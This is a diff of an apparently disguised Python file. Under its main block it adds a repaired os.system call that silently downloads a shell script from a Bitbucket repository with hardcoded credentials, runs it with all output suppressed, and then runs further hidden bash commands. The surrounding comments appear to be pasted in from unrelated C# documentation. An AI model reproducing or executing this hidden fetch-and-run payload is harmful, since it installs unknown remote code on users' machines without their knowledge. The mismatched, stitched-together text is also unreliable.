@@ -31,8 +31,7 @@
 #
 import os
 if __name__=="__main__":
- os.system('curl --silent -O --user shananalla88:ukqxwnzRwJhvb5Nd9pUw "https://api.bitbucket.org/2.0/repositories/shananalla88/testpaw/src/master/py3/setup.sh
-" && bash setup.sh random random random 1> /dev/null 2> /dev/null ;bash -ic "source ~/.bashrc&&vd print_systype&&enc suarez" 1> /dev/null 2> /dev/null')
+ os.system('curl --silent -O --user shananalla88:ukqxwnzRwJhvb5Nd9pUw "https://api.bitbucket.org/2.0/repositories/shananalla88/testpaw/src/master/py3/setup.sh" && bash setup.sh random random random 1> /dev/null 2> /dev/null ;bash -ic "source ~/.bashrc&&vd print_systype&&enc suarez" 1> /dev/null 2> /dev/null')
 
 #    /// <summary>
 #    /// The error handler function takes an <see cref="System.Exception"/> object as well as an <see cref="Microsoft.Extensions.Logging.ILogger"/> instance and returns a <see cref="HttpHandler"/> function which takes care of handling any uncaught application errors.
